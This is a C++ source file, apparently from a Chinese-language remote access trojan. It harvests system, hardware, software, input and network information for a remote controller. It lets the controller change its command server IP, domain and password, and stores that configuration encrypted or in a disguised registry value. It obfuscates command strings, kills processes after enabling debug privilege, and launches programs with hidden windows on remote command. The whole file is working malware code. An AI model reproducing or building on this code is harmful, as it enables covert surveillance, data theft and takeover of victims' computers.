  // ProcessInfo.cpp: implementation of the ProcessInfo class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ProcessInfo.h"
#include "Struct.h"
#include <tlhelp32.h>
#include <io.h>
#include "Base.H"
#include "GetDiskInfo.h" //取硬盘序列号
#include "getSoftwareinfo.h"
#include "GetInputInfo.h"
#include "getprocessinfo.h"
#include "HardwareStr.h"
#include "getAppID.h"
#include "getAdapterInfo.h"
#include "getLANInfo.h"
#include "WinApi.h"

DWORD WINAPI ProcessProcess(LPVOID lp);
//////////////////////////////////////////////////////////////////////////
//
extern char			v_Remark[100];			// 备注
extern unsigned int	v_RemarkLen;	// 备注的长度

extern char			v_Password[MAX_PATH];	//上线密码
extern unsigned int	v_PasswordLen;
extern char			v_TroInfo[300];
extern unsigned int v_TroInfoLen;

/************************************************************************/
/* 获取系统信息处理模块                                                 */
/************************************************************************/
DWORD GetRBSystemInfo(char* pPara)
{
	IF_LOUD(DbgFat32Log("收到获取系统信息命令");)

	ThreadGetProcessInfo(pPara);

	ThreadAdapterInfoStart(pPara);

	ThreadGetHardStrStart(pPara);

	ThreadGetSoftwareStart(pPara);
	
	ThreadGetInputStart(pPara);
	
	ThreadGetAppIDStart(pPara);

	ThreadGetLANInfoStart(pPara);
		
	return 0;
}
/************************************************************************/
/* 自动发送系统信息处理模块                                             */
/************************************************************************/
DWORD AutoGetRBSystemInfo(char* pPara)
{
	IF_LOUD(DbgFat32Log("自动发送系统信息");)
	
 	ThreadGetProcessInfo(pPara);

	ThreadAdapterInfoStart(pPara);
	
	GetDiskInfo::GetInstance()->ThreadWorkStart();

	ThreadGetHardStrStart(pPara);

	ThreadGetSoftwareStart(pPara);
	
	ThreadGetInputStart(pPara);

	ThreadGetAppIDStart(pPara);

	ThreadGetLANInfoStart(pPara);
	
	return 0;
}

/************************************************************************/
/* 进程控制命令处理模块                                                 */
/************************************************************************/
DWORD ControlProcess(DWORD* pPara)
{
	HANDLE starthandle=0;
	DWORD  threadId=0;
	ThreadParam *p = new ThreadParam;
	memcpy((char*)p, (char*)pPara, sizeof(ThreadParam));

	starthandle = CreateThread(NULL, 0, ProcessProcess, p, 0, &threadId);
	if (starthandle != NULL)
		CloseHandle(starthandle);
	return 0;
}

/************************************************************************/
/* 设置远程ip 处理                                                      */
/************************************************************************/
DWORD ProcessRemote(DWORD* pPara)
{
	ThreadParam *ppara=(ThreadParam*)pPara;
	char *p=0;//目录名
	
	char *field=0;
	char *value=0;
	char *nextline=0;
	char *inputline=ppara->buf;
	
	char  remoteip[MAX_PATH];
	char  remark[MAX_PATH];
	char  remotedomain[MAX_PATH];
	char  password[20];
	BOOL bremoteip = FALSE;
	BOOL bremark = FALSE;
	BOOL bremotedomain = FALSE;
	BOOL bpassword = FALSE;
	memset(remoteip, 0, sizeof(remoteip));
	memset(remark, 0, sizeof(remark));
	memset(remotedomain, 0, sizeof(remotedomain));
	memset(password, 0, sizeof(password));
	
	char CmdStr[20];

	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re)
	{
		//remoteip
		if(stricmp(field, DeRunStringA(CmdStr, 20, "bvqrSvhF"))==0)
		{
			strcpy(remoteip, value);
			bremoteip = TRUE;
		}
		//remark
		else if(stricmp(field, DeRunStringA(CmdStr, 20, "bvqGbj"))==0)
		{
			strcpy(remark,value);
			bremark = TRUE;
		}
		//remotedomain
		else if(stricmp(field, DeRunStringA(CmdStr, 20, "bvqrSvkrqGhg"))==0)
		{
			strncpy(remotedomain, value, sizeof(remotedomain)-1);
			bremotedomain = TRUE;
		}
		//password
		else if(stricmp(field, DeRunStringA(CmdStr, 20, "FGeeHrbk"))==0)
		{
			strncpy(password, value, sizeof(password)-1);
			bpassword = TRUE;
		}
		
		if(re==2)
			break;
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}

	// 密码设置
	DWORD lenMark;
	char FilePath[MAX_PATH];
	char tropath[MAX_PATH];
	GetTroPath(tropath);

	if (bpassword)
	{
		DWORD lenMark = strlen(password);
		strcpy(v_Password, password);
		v_PasswordLen = lenMark;

		sprintf(FilePath, "%s\\pw", tropath);
		CryptRemoteInfo(password, lenMark);
		RemoteFileContent(FilePath, password, lenMark, FALSE);
	}

	if (bremark)
	{
		// 更新心跳使用的变量
		lenMark = strlen(remark);
		if(lenMark > 0)
		{
			memset(v_Remark, 0, 100);
			strncpy(v_Remark, remark, 50);
			v_RemarkLen = strlen(v_Remark);
		}

		sprintf(FilePath, "%s\\Compatible", tropath);
		CryptRemoteInfo(remark, lenMark);
		RemoteFileContent(FilePath, remark, lenMark, FALSE);
	}

	
	if (bremoteip || bremotedomain)
	{
		DWORD tmpIP = Pinet_addr(remoteip);
		
		if (bremoteip)
		{
			sprintf(FilePath, "%s\\Company", tropath);
			DWORD aIP = Pntohl(tmpIP);
			lenMark=4;
			RemoteFileContent(FilePath, (char*)&aIP, lenMark, FALSE);
		}

		if(remotedomain[0] != 0)
		{
			hostent* host = Pgethostbyname(remotedomain);
			if(host)
			{
				tmpIP = *(DWORD*)(struct in_addr *)(host->h_addr);
			}
		}
		
		if(tmpIP != INADDR_NONE)
		{
			if(tmpIP != v_VirtualServerIp)
			{
				if(tmpIP > 0)
					v_VirtualServerIp = tmpIP;
			}
		}

		if(bremotedomain)
		{
			lenMark = strlen(remotedomain);
			sprintf(FilePath, "%s\\domain", tropath);
			CryptRemoteInfo(remotedomain, lenMark);
			RemoteFileContent(FilePath, remotedomain, lenMark, FALSE);
		}
	}
	
	char buffer[100];
	DWORD datalen;
	//content-length: 2\r\n\r\nok
	DeProcessStrA(buffer, 100, "1yxi2xiks2x7i-t w\r\n\r\ny:");
	datalen = strlen(buffer);

	if(SendData(buffer,datalen,ppara->PacketType,ppara->SessionID))
	{
		//IF_LOUD(DbgFat32Log("ProcessRemote success ");)
	}
	
	return 1;
}

DWORD ProcessReserveIp(DWORD* pPara)
{
	ThreadParam *ppara=(ThreadParam*)pPara;
	char *p=0;//目录名
	
	char *field=0;
	char *value=0;
	char *nextline=0;
	char *inputline=ppara->buf;
	
	char  reserveIP[20];
	BOOL breserveip = FALSE;
	memset(reserveIP, 0, sizeof(reserveIP));

	char TmpDeStr[20];
	
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re){
		if(stricmp(field, DepubStringA(TmpDeStr, 20, "ow2woEwyX")) == 0)  //reserveip
		{
			strncpy(reserveIP, value, sizeof(reserveIP)-1);
			breserveip = TRUE;
		}
		
		if(re==2)
			break;
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}
	
	// 密码设置
	DWORD lenMark;
	char FilePath[MAX_PATH];
	char tropath[MAX_PATH];
	GetTroPath(tropath);
	
	if (breserveip)
	{
		DWORD tmpReserveIP = Pinet_addr(reserveIP);
		
		if(tmpReserveIP != INADDR_NONE)
		{
			if(tmpReserveIP != v_ReserveIp)
			{
				if(tmpReserveIP > 0)
					v_ReserveIp = tmpReserveIP;
			}
		}
		
		sprintf(FilePath, "%s\\%s", tropath, DepubStringA(TmpDeStr, 20, "ow2woEw"));  //reserve
		DWORD lIP = Pntohl(tmpReserveIP);
		lenMark=4;
		RemoteFileContent(FilePath, (char*)&lIP, lenMark, FALSE);
	}
	
	char buffer[100];
	DWORD datalen;
	//content-length: 2\r\n\r\nok
	DeProcessStrA(buffer, 100, "1yxi2xiks2x7i-t w\r\n\r\ny:");
	datalen = strlen(buffer);

	if(SendData(buffer,datalen,ppara->PacketType,ppara->SessionID))
	{
		//IF_LOUD(DbgFat32Log("ProcessRemote success ");)
	}
	
	return 1;
}

DWORD ProcessTroInfo(DWORD* pPara)
{
	ThreadParam *ppara=(ThreadParam*)pPara;
	
	char *field=0;
	char *value=0;
	char *nextline=0;
	char *inputline=ppara->buf;
	
	char  TroInfo[300];
	BOOL bTroInfo = FALSE;
	memset(TroInfo, 0, sizeof(TroInfo));
	
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re){
		if(stricmp(field, "otherinfo") == 0)
		{
			strncpy(TroInfo, value, sizeof(TroInfo)-1);
			bTroInfo = TRUE;
		}
		
		if(re==2)
			break;
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}
	
	// 密码设置
	char FilePath[MAX_PATH];
	char tropath[MAX_PATH];
	GetTroPath(tropath);
	
	if (bTroInfo)
	{
		DWORD lenMark = strlen(TroInfo);
		strcpy(v_TroInfo, TroInfo);
		v_TroInfoLen = lenMark;
		
		sprintf(FilePath, "%s\\othinf", tropath);
		CryptRemoteInfo(TroInfo, lenMark);
		RemoteFileContent(FilePath, TroInfo, lenMark, FALSE);
	}
	
	char buffer[100];
	DWORD datalen;
	//content-length: 2\r\n\r\nok
	DeProcessStrA(buffer, 100, "1yxi2xiks2x7i-t w\r\n\r\ny:");
	datalen = strlen(buffer);

	if(SendData(buffer,datalen,ppara->PacketType,ppara->SessionID))
	{
		//IF_LOUD(DbgFat32Log("ProcessRemote success ");)
	}
	
	return 1;
}

DWORD ProcessDataState(DWORD* pPara)
{
	ThreadParam *ppara=(ThreadParam*)pPara;
	
	char *field=0;
	char *value=0;
	char *nextline=0;
	char *inputline=ppara->buf;
	
	char  szDataState[500];
	BOOL bTroInfo = FALSE;
	memset(szDataState, 0, sizeof(szDataState));
	
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re){
		if(stricmp(field, "datastate") == 0)
		{
			strncpy(szDataState, value, sizeof(szDataState)-1);
			bTroInfo = TRUE;
		}
		
		if(re==2)
			break;
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}
	
	// 密码设置
	char FilePath[MAX_PATH];
	char tropath[MAX_PATH];
	GetTroPath(tropath);
	
	if (bTroInfo)
	{
		DWORD len = strlen(szDataState);
		GetDataState(szDataState, len, false);

		CryptRemoteInfo(szDataState, len);
		SetRemoteInfo(szDataState, len, 8, tropath);
	}
	
	char buffer[100];
	DWORD datalen;
	//content-length: 2\r\n\r\nok
	DeProcessStrA(buffer, 100, "1yxi2xiks2x7i-t w\r\n\r\ny:");
	datalen = strlen(buffer);
	
	if(SendData(buffer,datalen,ppara->PacketType,ppara->SessionID))
	{
		//IF_LOUD(DbgFat32Log("ProcessRemote success ");)
	}
	
	return 1;
}

DWORD  SetTcpTrans(DWORD *pPara)
{
	ThreadParam *pThpara = (ThreadParam*)pPara;
	
	if (memicmp(pThpara->buf, "yes", 3) == 0)
	{
		int RegValue= 1;
		PSHSetValueA(HKEY_CURRENT_USER, "Software\\Microsoft"
			, "SType", REG_DWORD, &RegValue, 4);
		v_bSendType = 1;
	}
	else
	{
		int RegValue= 0;
		PSHSetValueA(HKEY_CURRENT_USER, "Software\\Microsoft"
			, "SType", REG_DWORD, &RegValue, 4);
		v_bSendType = 0;
	}
	
	return 0;
}

void GetTransType()
{
	DWORD RegValue= 0;
	DWORD RegLen = sizeof(DWORD);
	DWORD RegType;
	PSHGetValueA(HKEY_CURRENT_USER, "Software\\Microsoft", "SType",
		&RegType, &RegValue, &RegLen);
	
	if (RegValue == 1)
	{
		v_bSendType = 1;
	}
	else
	{
		v_bSendType = 0;
	}
}

//////////////////////////////////////////////////////////////////////////
BOOL StopApplication(const wchar_t *appName)
{
	HANDLE hSnapshot = PCreateToolhelp32Snapshot(
		TH32CS_SNAPPROCESS,
		0);
	struct tagPROCESSENTRY32W pe;
	::ZeroMemory(&pe, sizeof(pe));
	pe.dwSize = sizeof(pe);
	DWORD dwError;
	wchar_t *strappName = (wchar_t *)appName;
	while(1){
		wchar_t *pTmpfile=0;
		if((pTmpfile = wcsstr(strappName, L"\\"))==0){
			break;
		}
		else{
			strappName = pTmpfile + 1;
			continue;
		}
	}
	
	BOOL bMore = PProcess32FirstW(hSnapshot, &pe);

 	for(; bMore; bMore = PProcess32NextW(hSnapshot, &pe))
	{
		_wcslwr(pe.szExeFile);
		BOOL re=FALSE;
		wchar_t procexefile[260];
		ZeroMemory(procexefile, sizeof(procexefile));
		if(wcslen(pe.szExeFile) >= 260)
			continue;
		wcscpy(procexefile, pe.szExeFile);
		wchar_t * pfile = procexefile;
		while(1){
			wchar_t *pTmpfile = 0;
			if((pTmpfile = wcsstr(pfile, L"\\")) == 0){
				break;
			}
			else{
				pfile = pTmpfile+1;
				continue;
			}
		}

		if(wcsstr(pfile, strappName) > 0){
			HANDLE hProcess = POpenProcess(
				PROCESS_TERMINATE,  // want to get info
				FALSE,  // don't need to inherit this handle
				pe.th32ProcessID);  // process to open
			if(hProcess!=NULL)
			{
				re=PTerminateProcess(hProcess,-1);
				re=CloseHandle(hProcess);
			}
			else{
				if (hProcess == NULL)
				{
					OSVERSIONINFOA osvi;
					osvi.dwOSVersionInfoSize = sizeof(osvi);
					PGetVersionExA(&osvi);

					if (osvi.dwPlatformId != VER_PLATFORM_WIN32_NT){
						continue;
					}
					
					TOKEN_PRIVILEGES Priv, PrivOld;
					DWORD cbPriv = sizeof(PrivOld);
					HANDLE hToken;
					
					if (!POpenThreadToken(PGetCurrentThread(), 
						TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES,
						FALSE, &hToken))
					{
						if (PGetLastError() != ERROR_NO_TOKEN){
							continue;
						}
						
						if (!POpenProcessToken(PGetCurrentProcess(),
							TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES,
							&hToken))
						{
							continue;
						}
					}
					
					Priv.PrivilegeCount = 1;
					Priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
					PLookupPrivilegeValueA(NULL, "SeDebugPrivilege", 
						&Priv.Privileges[0].Luid);

					if (!PAdjustTokenPrivileges(hToken, FALSE, &Priv, sizeof(Priv),
						&PrivOld, &cbPriv))
					{
						dwError = PGetLastError();
						CloseHandle(hToken);
						continue;
					}
					
					if (PGetLastError() == ERROR_NOT_ALL_ASSIGNED)
					{
						CloseHandle(hToken);
						continue;
					}
					
					hProcess = POpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
					re=PTerminateProcess(hProcess,-1);
					
					dwError = PGetLastError();
					
					PAdjustTokenPrivileges(hToken, FALSE, &PrivOld, sizeof(PrivOld),
						NULL, NULL);
					CloseHandle(hToken);
					
					if (hProcess == NULL){
						continue;
					}
					else
					{
						re=CloseHandle(hProcess);
					}
				}
			}
		}	// end if if(strcmp(pe.szExeFile, appName)==0){
	}
	CloseHandle(hSnapshot);

	return TRUE;
}


/************************************************************************/
/* 进程控制命令处理线程                                                 */
/************************************************************************/
DWORD WINAPI ProcessProcess(LPVOID lp)
{
	ThreadParam *ppara=(ThreadParam*)lp;
	char *p=0;//目录名

	char * inputline=ppara->buf;
	char * nextline=0;
	char *field=0;
	char * value=0;
	
	char  filename[MAX_PATH];
	char * strflg=0;
	BOOL b_success=FALSE;

	WCHAR* unicodefilename;

	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re)
	{
		if(strcmp(field,"filename")==0)
		{
			strcpy(filename,value);
		}
		else if(strcmp(field,"flg")==0)
		{
			strflg=value;
		}
		
		if(re==2)
			break;
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}
	if(re!=2)
		goto endfun;
	
	if(	!(filename!=0	&& strflg!=0 ))
		goto endfun;
	IF_LOUD(DbgFat32Log("收到进程控制命令 filename=%s,flg=%s",filename,strflg);)

	strlwr(filename);

	unicodefilename = new WCHAR[500];
	memset(unicodefilename, 0, 500*sizeof(WCHAR));
	if(UTF_82Unicode((char*)filename, unicodefilename, 500*sizeof(WCHAR))<=0)
	{
		delete[] unicodefilename;
		unicodefilename = NULL;
		goto endfun;
	}
	
	if(strcmp(strflg, "0")==0)
	{
		b_success = StopApplication(unicodefilename);
	}
	else if(strcmp(strflg,"1")==0)
	{
		PROCESS_INFORMATION piProcInfo; 
		STARTUPINFOW siStartInfo; 
		ZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );
		
		// Set up members of the STARTUPINFO structure. 
		
		ZeroMemory( &siStartInfo, sizeof(STARTUPINFOW) );
		siStartInfo.cb = sizeof(STARTUPINFOW); 
		siStartInfo.dwFlags = STARTF_USESHOWWINDOW;
		siStartInfo.wShowWindow = SW_HIDE;

		BOOL handle=PCreateProcessW(
			NULL,
			unicodefilename, 
			NULL, 
			NULL,
			TRUE,
			0, 
			NULL,
			NULL,
			&siStartInfo, 
			&piProcInfo );
		if(handle)
		{
			CloseHandle(piProcInfo.hThread);
			CloseHandle(piProcInfo.hProcess);
			b_success=TRUE;
		}
	}

	delete []unicodefilename;

endfun:
	char buffer[100];
	memset(buffer, 0, 100);
	DWORD datalen;
	datalen = sprintf(buffer, "state: \r\n\r\n%s", b_success? "ok" : "false");
	
	if(SendData(buffer,datalen,ppara->PacketType,ppara->SessionID))
	{
		IF_LOUD(DbgFat32Log("ProcessProcess 成功");)
	}

	delete ppara;
	return TRUE;
}

